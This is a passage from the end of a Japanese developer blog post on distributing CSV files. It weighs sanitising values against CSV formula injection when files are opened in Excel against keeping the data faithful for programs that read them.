無害化はタダではありません。`'` を前置すると値そのものが変わるので、その CSV をプログラムで読む側には、先頭に `'` の付いた値が渡ります。さらに OWASP が指摘するとおり、Excel は保存や再オープンの途中でクォートを外すことがあり、一度無害化した値が再び数式に戻ることもありえます。

安全性とデータの忠実さは、ここで両立しません。だから、人が Excel で開く配布物では安全性を優先し、機械が読む中間 CSV では忠実さを優先する、と分けました。完全な無害化はないと認めたうえで、せめて開いた瞬間に発火する事故だけは防ぐ。優先順位はそこに置いています。

# おわりに

「CSV くらい余裕でしょ」そう思われがちですが、実際に配る側に回ると、想像よりずっと難しいフォーマットでした。一番堪えたのは、その難しさが **フォーマットそのものより「誰が・どのアプリで開くか」に依存する** という点です。RFC 4180 を完璧に守った CSV でも、Excel で開かれた瞬間に値は化け、`=` で始まる値はコードとして実行されうる。だから「出力が正しいか」だけでなく、「どう配るか」「開かれたときに安全か」までを、作る側の責任として最初から組み込む必要がありました。

作る → 配る → 開かれる、という見取り図を持っておくと、新しい罠に出会っても迷いません。どの段の話で、最終的に誰が開くのかを先に決めれば、生成側で直すのか、仕様で伝えるのか、無害化するのかが自然に決まります。特に数式インジェクションは「全部に効かせれば安全」ではなく、何を・どこで無害化するかを分けて考える問題でした。

そして地味ながら一番効いたのは、出力を byte-identical に保つことかもしれません。再生成しても 1 バイトも変わらない。それをテストで固定しておくだけで、配布物の運用は驚くほど穏やかになりました。

この記事が、CSV を出力する側に回って同じ壁にぶつかっている方の地図になれば幸いです👋
